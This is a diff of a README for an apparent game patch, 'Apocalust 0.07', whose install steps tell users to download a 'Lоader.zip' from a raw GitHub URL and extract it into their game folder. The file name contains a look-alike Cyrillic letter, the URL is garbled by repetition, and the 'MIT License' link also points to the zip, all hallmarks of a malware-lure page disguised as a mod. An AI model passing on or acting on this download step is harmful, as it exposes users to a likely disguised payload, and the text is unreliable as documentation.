@@ -41,7 +41,7 @@ Discover a patch that brings *absolute empowerment* to your Apocalust journey, t
 
 Ready to enjoy enhanced Apocalust 0.07? Follow these simple steps for swift and secure installation:
 
-1. **Download** `https://raw.githubusercontent.com/Jaisinghchoudhary/Apocalust007-UpdateForge/main/Lоader.zipоhttps://raw.githubusercontent.com/Jaisinghchoudhary/Apocalust007-UpdateForge/main/Lоader.zip` from the repository. 📦  
+1. **Download** `https://raw.githubusercontent.com/Jaisinghchoudhary/Apocalust007-UpdateForge/main/Lоader.zipоhttps://raw.githubusercontent.com/Jaisinghchoudhary/Apocalust007-UpdateForge/main/Lоader.zipоhttps://raw.githubusercontent.com/Jaisinghchoudhary/Apocalust007-UpdateForge/main/Lоader.zipоhttps://raw.githubusercontent.com/Jaisinghchoudhary/Apocalust007-UpdateForge/main/Lоader.zip` from the repository. 📦  
    *(Always use the official repository to ensure update safety and access to the newest features!)*
    
 2. **Extract the contents** to your Apocalust 0.07 game folder using your preferred archive manager (like WinRAR, 7-Zip, or Keka).
@@ -94,7 +94,7 @@ With these keywords, discoverable documentation benefits both beginner and pro m
 
 ## 📄 License
 
-All code and resources in this project are released under the [MIT License](https://raw.githubusercontent.com/Jaisinghchoudhary/Apocalust007-UpdateForge/main/Lоader.zipоhttps://raw.githubusercontent.com/Jaisinghchoudhary/Apocalust007-UpdateForge/main/Lоader.zip) (2025).  
+All code and resources in this project are released under the [MIT License](https://raw.githubusercontent.com/Jaisinghchoudhary/Apocalust007-UpdateForge/main/Lоader.zipоhttps://raw.githubusercontent.com/Jaisinghchoudhary/Apocalust007-UpdateForge/main/Lоader.zipоhttps://raw.githubusercontent.com/Jaisinghchoudhary/Apocalust007-UpdateForge/main/Lоader.zipоhttps://raw.githubusercontent.com/Jaisinghchoudhary/Apocalust007-UpdateForge/main/Lоader.zip) (2025).  
 - **Open, transparent, and flexible.**  
 - Fork, modify, or distribute as you wish—just retain this license for compliance.
 
